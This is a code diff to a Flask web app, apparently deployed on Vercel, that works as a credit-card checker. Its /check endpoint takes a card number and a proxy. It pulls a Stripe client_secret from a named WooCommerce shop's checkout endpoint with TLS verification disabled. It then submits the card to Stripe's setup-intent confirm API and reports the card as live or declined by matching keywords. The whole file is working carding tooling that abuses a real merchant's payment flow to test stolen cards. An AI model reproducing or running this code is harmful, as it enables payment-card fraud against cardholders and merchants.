@@ -7,6 +7,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
+# Keywords that indicate live CVV
 CVV_LIVE_KEYWORDS = [
     "succeeded", "payment_method.attached", "payment_method.created",
     "setup_intent.succeeded", "payment_method_saved", "card_verified",
@@ -17,6 +18,7 @@ CVV_LIVE_KEYWORDS = [
     "Payment method saved"
 ]
 
+# Build proxy dictionary from string
 def build_proxy(proxy_str):
     try:
         ip, port, user, pw = proxy_str.split(":")
@@ -27,10 +29,15 @@ def build_proxy(proxy_str):
     except:
         return None
 
+@app.route('/')
+def home():
+    return "Flask is working on Vercel!"
+
 @app.route('/check', methods=['GET'])
 def check_card():
     cc = request.args.get("cc")
     proxy_param = request.args.get("proxy")
+
     if not cc:
         return "Declined", 400
 
@@ -44,6 +51,7 @@ def check_card():
     proxies = build_proxy(proxy_param) if proxy_param else None
 
     try:
+        # Get client_secret from WooCommerce Stripe
         setup = requests.post(
             "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
             data={"payment_method": "stripe_cc"},
@@ -52,9 +60,11 @@ def check_card():
             timeout=30,
             verify=False
         )
+
         seti = setup.text.split('{"client_secret":"')[1].split('"}')[0]
         secret = setup.text.split('{"client_secret":"')[1].split('_secret_')[0]
 
+        # Submit card to Stripe confirm endpoint
         confirm = requests.post(
             f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
             data={
@@ -82,5 +92,5 @@ def check_card():
         else:
             return "Declined"
 
-    except:
+    except Exception as e:
         return "Declined", 500
